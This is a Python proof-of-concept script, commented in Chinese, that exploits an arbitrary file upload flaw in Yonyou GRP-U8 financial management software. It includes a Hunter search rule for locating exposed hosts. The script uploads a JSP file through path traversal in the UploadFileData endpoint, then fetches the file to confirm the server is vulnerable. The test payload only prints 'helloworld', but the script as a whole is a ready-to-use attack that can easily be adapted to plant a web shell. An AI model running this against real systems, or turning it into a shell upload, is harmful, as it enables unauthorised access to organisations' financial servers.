#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

from dataclasses import fields
from email.mime import multipart
import random
from urllib import response
from importlib_metadata import files
import requests
from requests_toolbelt import MultipartEncoder
from Config.config_requests import ua

requests.packages.urllib3.disable_warnings()
# 脚本信息
######################################################
NAME = '用友 GRP-U8 财务管理软件任意文件上传漏洞'
AUTHOR = "JDQ"
REMARK = '用友 GRP-U8 财务管理软件任意文件上传漏洞'
HUNTER_RULE = 'web.icon=="b41be1ccc6f9f2894e0cfcf23acf5fc0"'
######################################################

# proxies = {
#     "http": 'http://127.0.0.1:8080',
#     "https": 'http://127.0.0.1:8080'
# }
headers = {
    "User-Agent": ua
}
stra = r'''

<% out.println("helloworld");%>'''
m = MultipartEncoder(
    fields={
        "myFile": ("test.txt", stra),
    },
    boundary='---------------------------107161996541389066151862863273'
)
headers['Content-Type'] = m.content_type


def poc(target):

    try:
        r = requests.post(target+r'/UploadFileData?action=upload_file&foldername=%2e%2e%2f&filename=2.jsp', headers=headers, data=m,  # proxies=proxies,
                          verify=False, timeout=5,)
        if r.status_code == 200:
            r = requests.get(
                target+"/R9iPortal/2.jsp")
            print("[+] 目标 {} 存在漏洞".format(target), r.text)

    except Exception as e:
        pass


if __name__ == '__main__':
    poc("http://127.0.0.1")
